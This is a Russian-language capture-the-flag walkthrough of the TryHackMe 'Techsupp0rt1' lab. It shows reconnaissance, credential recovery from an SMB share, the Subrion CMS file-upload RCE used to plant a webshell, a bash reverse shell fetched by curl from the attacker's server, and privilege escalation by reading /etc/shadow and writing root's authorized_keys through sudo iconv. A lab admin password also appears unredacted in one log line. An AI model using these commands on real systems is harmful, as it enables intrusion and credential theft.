## Techsupp0rt1
- https://tryhackme.com/room/techsupp0rt1
### Разведка

nmap -sC -sV
- Стандартные скрипты
- сканирование версий

```
nmap -sC -sV 10.65.159.215
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-08 23:23 +0300
Nmap scan report for 10.65.159.215
Host is up (0.19s latency).
Not shown: 996 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 10:8a:f5:72:d7:f9:7e:14:a5:c5:4f:9e:97:8b:3d:58 (RSA)
|   256 7f:10:f5:57:41:3c:71:db:b5:5b:db:75:c9:76:30:5c (ECDSA)
|_  256 6b:4c:23:50:6f:36:00:7c:a6:7c:11:73:c1:a8:60:0c (ED25519)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: TECHSUPPORT; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2026-01-08T20:23:32
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: techsupport
|   NetBIOS computer name: TECHSUPPORT\x00
|   Domain name: \x00
|   FQDN: techsupport
|_  System time: 2026-01-09T01:53:34+05:30
|_clock-skew: mean: -1h49m59s, deviation: 3h10m30s, median: -1s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 50.44 seconds
```

- 22 - ssh
- 80 - http
- 139 - smb
- 445 - smb

Сразу можно перебрать директории сайта: 
```
└─$ feroxbuster -u http://10.65.159.215/ --dont-extract-links
🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      278c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      375l      968w    11321c http://10.65.159.215/
301      GET        9l       28w      313c http://10.65.159.215/test => http://10.65.159.215/test/
301      GET        9l       28w      318c http://10.65.159.215/wordpress => http://10.65.159.215/wordpress/
301      GET        9l       28w      330c http://10.65.159.215/wordpress/wp-includes => http://10.65.159.215/wordpress/wp-includes/
301      GET        9l       28w      327c http://10.65.159.215/wordpress/wp-admin => http://10.65.159.215/wordpress/wp-admin/
301      GET        9l       28w      329c http://10.65.159.215/wordpress/wp-content => http://10.65.159.215/wordpress/wp-content/
301      GET        9l       28w      336c http://10.65.159.215/wordpress/wp-admin/includes => http://10.65.159.215/wordpress/wp-admin/includes/
301      GET        9l       28w      336c http://10.65.159.215/wordpress/wp-content/themes => http://10.65.159.215/wordpress/wp-content/themes/
301      GET        9l       28w      337c http://10.65.159.215/wordpress/wp-content/plugins => http://10.65.159.215/wordpress/wp-content/plugins/
301      GET        9l       28w      335c http://10.65.159.215/wordpress/wp-admin/network => http://10.65.159.215/wordpress/wp-admin/network/
301      GET        9l       28w      333c http://10.65.159.215/wordpress/wp-admin/maint => http://10.65.159.215/wordpress/wp-admin/maint/
301      GET        9l       28w      349c http://10.65.159.215/wordpress/wp-content/plugins/redirection => http://10.65.159.215/wordpress/wp-content/plugins/redirection/
```
Отсюда становится понятно что сайт написан на Wordpress

Директория /test/#
<img width="1470" height="774" alt="Pasted image 20260109004142" src="https://github.com/user-attachments/assets/6898365f-ca68-4924-aff4-480f7a26956f" />

С 80 портом пока закончим. Интересно и необычно это порты 139 и 445. Там запущен SMB.

>**SMB (Server Message Block)** — это сетевой протокол, который позволяет компьютерам **делиться файлами, папками, принтерами** в локальной сети.

Посмотрим что там лежит.
```
└─$ smbclient -L //10.65.159.215 -N

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	websvr          Disk      
	IPC$            IPC       IPC Service (TechSupport server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP  
```
print$ и IPC$ нам не интересно. а вот **websvr** звучит интересно. Посмотрим что там.

```
smbclient \\\\10.65.159.215\\websvr 
Password for [WORKGROUP\obsca]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat May 29 10:17:38 2021
  ..                                  D        0  Sat May 29 10:03:47 2021
  enter.txt                           N      273  Sat May 29 10:17:38 2021

		8460484 blocks of size 1024. 5686708 blocks available
smb: \> get enter.txt
getting file \enter.txt of size 273 as enter.txt (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)
smb: \> 

```

Читаем
```
└─$ cat enter.txt                                          
GOALS
=====
1)Make fake popup and host it online on Digital Ocean server
2)Fix subrion site, /subrion doesn't work, edit from panel
3)Edit wordpress website

IMP
===
Subrion creds
|->admin:[REDACTED] [cooked with magical formula]
Wordpress creds
|->
```
И у нас есть креды, но пароль зашифрован. пробуем дешифровать с помощью [Cyberchef](https://cyberchef.immersivelabs.online/). 
Получаем наш пароль и пытаемся зайти на WP

<img width="1470" height="776" alt="Pasted image 20260108235840" src="https://github.com/user-attachments/assets/6e10a27a-20ab-4d41-b2a6-2fc34397c478" />

Оказалось этот пароль не подходит для WP. Думаем дальше. в письме сказано про некий Subrion. Гугл говорит, что это CMS. 
>**CMS (Content Management System)** — это **система управления контентом**.
>Это программа, которая позволяет создавать и управлять сайтом **без написания кода**. 

Смотрим что есть на /subrion/robots.txt
<img width="729" height="227" alt="Pasted image 20260109002239" src="https://github.com/user-attachments/assets/28eb5add-880e-452a-a970-442c4e826c9d" />

/subrion/panel/:
<img width="1470" height="775" alt="Pasted image 20260108235907" src="https://github.com/user-attachments/assets/6d2d63f4-68a3-4d13-af74-cf0fc37cdf03" />

Заходим по этим кредам и попадаем в CMS.
<img width="1470" height="776" alt="Pasted image 20260108235852" src="https://github.com/user-attachments/assets/68dc092b-b9d7-4eda-b5c9-5f7efae64660" />

### Эксплуатация
Слева снизу сразу видим версию CMS - **subrion 4.2.1**. Пробуем найти CVE.
```
msf > search Subrion CMS

Matching Modules
================

   #  Name                                            Disclosure Date  Rank       Check  Description
   -  ----                                            ---------------  ----       -----  -----------
   0  exploit/multi/http/subrion_cms_file_upload_rce  2018-11-04       excellent  Yes    Intelliants Subrion CMS 4.2.1 - Authenticated File Upload Bypass to RCE


Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/http/subrion_cms_file_upload_rce

msf > use 0
```
Использую metasploit

```
msf exploit(multi/http/subrion_cms_file_upload_rce) > run
[*] Started reverse TCP handler on 192.168.135.72:5555 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking target web server for a response at: http://10.65.159.215/subrion/panel/panel/
[+] Target is running Subrion CMS.
[*] Checking Subrion CMS version...
[+] Target is running Subrion CMS Version 4.2.1.
[+] The target appears to be vulnerable. However, this version check does not guarantee that the target is vulnerable, since a fix for the vulnerability can easily be applied by a web admin.
[*] Connecting to Subrion Admin Panel login page to obtain CSRF token...
[+] Successfully obtained CSRF token: gg7PVQXz2LgfadiUBnEM7WUxFuDlEbbXPuvOxajF
[*] Logging in to Subrion Admin Panel at: http://10.65.159.215/subrion/panel/panel/ using credentials admin:Scam2021
[+] Successfully logged in as Administrator.
[*] Preparing payload...
[*] Sending POST data...
[+] Successfully uploaded payload at: http://10.65.159.215/subrion/panel/uploads/xrtojkjdly.phar
[*] Executing 'xrtojkjdly.phar'... This file will be deleted after execution.
[+] Successfully executed payload: http://10.65.159.215/subrion/panel/uploads/xrtojkjdly.phar
[*] Exploit completed, but no session was created.
```
Ничего не вышло... Вроде все правильно прописал, но не будем заострять на этом внимание. Ищем дальше.

Пробуем searchsploit.
```
─$ searchsploit subrion 
---------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                              |  Path
---------------------------------------------------------------------------- ---------------------------------
Subrion 3.x - Multiple Vulnerabilities                                      | php/webapps/38525.txt
Subrion 4.2.1 - 'Email' Persistant Cross-Site Scripting                     | php/webapps/47469.txt
Subrion Auto Classifieds - Persistent Cross-Site Scripting                  | php/webapps/14391.txt
SUBRION CMS - Multiple Vulnerabilities                                      | php/webapps/17390.txt
Subrion CMS 2.2.1 - Cross-Site Request Forgery (Add Admin)                  | php/webapps/21267.txt
subrion CMS 2.2.1 - Multiple Vulnerabilities                                | php/webapps/22159.txt
Subrion CMS 4.0.5 - Cross-Site Request Forgery (Add Admin)                  | php/webapps/47851.txt
Subrion CMS 4.0.5 - Cross-Site Request Forgery Bypass / Persistent Cross-Si | php/webapps/40553.txt
Subrion CMS 4.0.5 - SQL Injection                                           | php/webapps/40202.txt
Subrion CMS 4.2.1 - 'avatar[path]' XSS                                      | php/webapps/49346.txt
Subrion CMS 4.2.1 - Arbitrary File Upload                                   | php/webapps/49876.py
Subrion CMS 4.2.1 - Cross Site Request Forgery (CSRF) (Add Amin)            | php/webapps/50737.txt
Subrion CMS 4.2.1 - Cross-Site Scripting                                    | php/webapps/45150.txt
Subrion CMS 4.2.1 - Stored Cross-Site Scripting (XSS)                       | php/webapps/51110.txt
---------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

На нашу версию есть целых 5 уязвимостей. Пробуем эту 
```
Subrion CMS 4.2.1 - Arbitrary File Upload                                   | php/webapps/49876.py
```
По описанию это вроде та же, что и в метасплойте, через загрузку файлов.

Скачиваем к себе и смотрим как работает скрипт.
```
└─$ python3 49876.py -h
Usage: 49876.py [options]

Options:
  -h, --help            show this help message and exit
  -u URL, --url=URL     Base target uri http://target/panel
  -l USER, --user=USER  User credential to login
  -p PASSW, --passw=PASSW
                        Password credential to login
```

Запускаем:
```
└─$ python3 49876.py -u http://10.65.159.215/subrion/panel/ -l admin -p [REDACTED]
[+] SubrionCMS 4.2.1 - File Upload Bypass to RCE - CVE-2018-19422 

[+] Trying to connect to: http://10.65.159.215/subrion/panel/
[+] Success!
[+] Got CSRF token: 8zgRONxp61nkBZSH9woXTwZnmxlZda6NAZGM4MDM
[+] Trying to log in...
[+] Login Successful!

[+] Generating random name for Webshell...
[+] Generated webshell name: wzgfrpoajdhdgjq

[+] Trying to Upload Webshell..
[+] Upload Success... Webshell path: http://10.65.159.215/subrion/panel/uploads/wzgfrpoajdhdgjq.phar 

$ whoami
www-data

$ python3 -c 'import pty; pty.spawn("/bin/bash")'

^Z
zsh: suspended  python3 49876.py -u 
```

Отлично! мы получили шелл, но он убогий, у меня не получилось сделать его приятнее, когда пытаюсь, то оболочка зависает. Давайте на своей машине создадим реверс шелл файл, закинем его на атакуемую машину и запустим, так мы должны получить полноценный шелл.

Создаем файл с простой командой для подключения с revshells.com и запускаем сервер:
```
└─$ echo 'bash -i >& /dev/tcp/192.168.135.72/6666 0>&1' > exp.sh
                                                                    
└─$ python -m http.server 8899
Serving HTTP on 0.0.0.0 port 8899 (http://0.0.0.0:8899/) ...
10.65.159.215 - - [09/Jan/2026 00:26:22] "GET /exp.sh HTTP/1.1" 200 -
```

Забираем файл на атакуемой машине:
```
$ curl http://192.168.135.72:8899/exp.sh -o exp.sh
```

Запускаем:
```
$ bash exp.sh
```

Заранее открыли порт и получаем наш нормальный шелл:
```
└─$ nc -lvnp 6666
listening on [any] 6666 ...
connect to [192.168.135.72] from (UNKNOWN) [10.65.159.215] 59812
bash: cannot set terminal process group (1350): Inappropriate ioctl for device
bash: no job control in this shell
www-data@TechSupport:/var/www/html/subrion/uploads$
```


Покапавший по файлам я решил заглянуть в вордпресс файлы и там нашел пароль в файле **wp-config.php** 
```
www-data@TechSupport:/home/scamsite/websvr$ cd /var/www/html/
cd /var/www/html/
www-data@TechSupport:/var/www/html$ ls
ls
index.html  phpinfo.php  subrion  test	wordpress
www-data@TechSupport:/var/www/html$cd wordpress
cd wordpress
www-data@TechSupport:/var/www/html/wordpress$ ls
ls
index.php	 wp-blog-header.php    wp-includes	  wp-settings.php
license.txt	 wp-comments-post.php  wp-links-opml.php  wp-signup.php
readme.html	 wp-config.php	       wp-load.php	  wp-trackback.php
wp-activate.php  wp-content	       wp-login.php	  xmlrpc.php
wp-admin	 wp-cron.php	       wp-mail.php
www-data@TechSupport:/var/www/html/wordpress$ cat wp-config.php
cat wp-config.php
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/support/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wpdb' );

/** MySQL database username */
define( 'DB_USER', 'support' );

/** MySQL database password */
define( 'DB_PASSWORD', '[REDACTED]' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         'put your unique phrase here' );
define( 'SECURE_AUTH_KEY',  'put your unique phrase here' );
define( 'LOGGED_IN_KEY',    'put your unique phrase here' );
define( 'NONCE_KEY',        'put your unique phrase here' );
define( 'AUTH_SALT',        'put your unique phrase here' );
define( 'SECURE_AUTH_SALT', 'put your unique phrase here' );
define( 'LOGGED_IN_SALT',   'put your unique phrase here' );
define( 'NONCE_SALT',       'put your unique phrase here' );

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', __DIR__ . '/wordpress/' );
}

define('WP_HOME', '/wordpress/index.php');
define('WP_SITEURL', '/wordpress/');

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';

```

```
www-data@TechSupport:/var/www/html/wordpress$ su scamsite
su scamsite
Password: [REDACTED]
```
Этот пароль подошел к единственному пользователю scamsite

Смотрим что можем делать:
```
scamsite@TechSupport:/var/www/html/wordpress$ sudo -l
sudo -l
Matching Defaults entries for scamsite on TechSupport:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User scamsite may run the following commands on TechSupport:
    (ALL) NOPASSWD: /usr/bin/iconv
```

Мы имеем доступ к iconv.
>iconv — это **утилита для преобразования кодировок текста** в Linux и macOS.
Она позволяет конвертировать текстовые файлы и строки из одной кодировки в другую

На GTFObins смотрим, что из этого можно извлечь
- https://gtfobins.github.io/gtfobins/iconv/


Отлично! мы можем читать файлы от имени рут! давайте проверим это
Читаем /etc/shadow

```
scamsite@TechSupport:/usr/bin$ LFILE=/etc/shadow
LFILE=/etc/shadow
scamsite@TechSupport:/usr/bin$ sudo /usr/bin/iconv -f 8859_1 -t 8859_1 "$LFILE"
<in$ sudo /usr/bin/iconv -f 8859_1 -t 8859_1 "$LFILE"                        
root:$6$.[REDACTED]:18775:0:99999:7:::
daemon:*:18484:0:99999:7:::
bin:*:18484:0:99999:7:::
sys:*:18484:0:99999:7:::
sync:*:18484:0:99999:7:::
games:*:18484:0:99999:7:::
man:*:18484:0:99999:7:::
lp:*:18484:0:99999:7:::
mail:*:18484:0:99999:7:::
news:*:18484:0:99999:7:::
uucp:*:18484:0:99999:7:::
proxy:*:18484:0:99999:7:::
www-data:*:18484:0:99999:7:::
backup:*:18484:0:99999:7:::
list:*:18484:0:99999:7:::
irc:*:18484:0:99999:7:::
gnats:*:18484:0:99999:7:::
nobody:*:18484:0:99999:7:::
systemd-timesync:*:18484:0:99999:7:::
systemd-network:*:18484:0:99999:7:::
systemd-resolve:*:18484:0:99999:7:::
systemd-bus-proxy:*:18484:0:99999:7:::
syslog:*:18484:0:99999:7:::
_apt:*:18484:0:99999:7:::
lxd:*:18775:0:99999:7:::
messagebus:*:18775:0:99999:7:::
uuidd:*:18775:0:99999:7:::
dnsmasq:*:18775:0:99999:7:::
sshd:*:18775:0:99999:7:::
scamsite:[REDACTED]:0:99999:7:::
mysql:!:18775:0:99999:7:::
```

Остается прочитать файл /root/root.txt:
```
scamsite@TechSupport:/usr/bin$ LFILE=/root/root.txt
LFILE=/root/root.txt
scamsite@TechSupport:/usr/bin$ sudo /usr/bin/iconv -f 8859_1 -t 8859_1 "$LFILE"
<in$ sudo /usr/bin/iconv -f 8859_1 -t 8859_1 "$LFILE"                        
[REDACTED]  -
scamsite@TechSupport:/usr/bin$ 
```
И получаем наш флаг!

Но все таки хочется получить root оболочку.
С помощью ssh-keygen у себя на машине создадим ssh ключ и через ту же команду закинем в ключи root пользователя
```
└─$ ssh-keygen           
Generating public/private ed25519 key pair.
Enter file in which to save the key (/home/obsca/.ssh/id_ed25519): key
Enter passphrase for "key" (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in key
Your public key has been saved in key.pub
The key fingerprint is:
SHA256:QfMBVKV1I1jxyePbIYZatFQ30GoO7s2tUF4/iHVbTDE obsca@kali
The key's randomart image is:
+--[ED25519 256]--+
|       .=oo+*+=E |
|       . o.+.=.++|
|        . oo  * .|
|         .o.o+ + |
|        S .++=.+o|
|          o.*.=o=|
|         ..oooooo|
|           ..o ..|
|             ..  |
+----[SHA256]-----+
                                                                                                                         
┌──(obsca㉿kali)-[~/Downloads]
└─$ cat key                                                
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACC69WU4nF5ZQ9FBN6+8PPy2THNqVEH1goadgTExkdI1QQAAAJAq9HUzKvR1
MwAAAAtzc2gtZWQyNTUxOQAAACC69WU4nF5ZQ9FBN6+8PPy2THNqVEH1goadgTExkdI1QQ
AAAEDxCCgw+PQOLjyT+Z2u0uaDVoXZAk6gdM1DUBj5FUilTbr1ZTicXllD0UE3r7w8/LZM
c2pUQfWChp2BMTGR0jVBAAAACm9ic2NhQGthbGkBAgM=
-----END OPENSSH PRIVATE KEY-----
                                                                                                                
┌──(obsca㉿kali)-[~/Downloads]
└─$ cat key.pub 
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILr1ZTicXllD0UE3r7w8/LZMc2pUQfWChp2BMTGR0jVB 
```

На атакуемой машине:
```
scamsite@TechSupport:/var/www/html/subrion/uploads$ echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILr1ZTicXllD0UE3r7w8/LZMc2pUQfWChp2BMTGR0jVB obsca@kali' | sudo /usr/bin/iconv -f 8859_1 -t 8859_1 -o /root/.ssh/authorized_keys
< /usr/bin/iconv -f 8859_1 -t 8859_1 -o /root/.ssh/authorized_keys
```

И теперь с помощью своего ключа подключимся с оболочкой root!
```
└─$ ssh root@10.66.172.151 -i key
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-186-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


120 packages can be updated.
88 updates are security updates.


Last login: Sun Nov 21 11:17:57 2021
root@TechSupport:~# whoami
root
root@TechSupport:~# cat /root/root.txt
[REDACTED]
```
И снова читаем наш флаг!
## Итог: почему удалось взломать?

- Устаревшая версия CMS
- Открыт SMB и креды передаются почти открыто
- Небезопасные Linux Capabilities


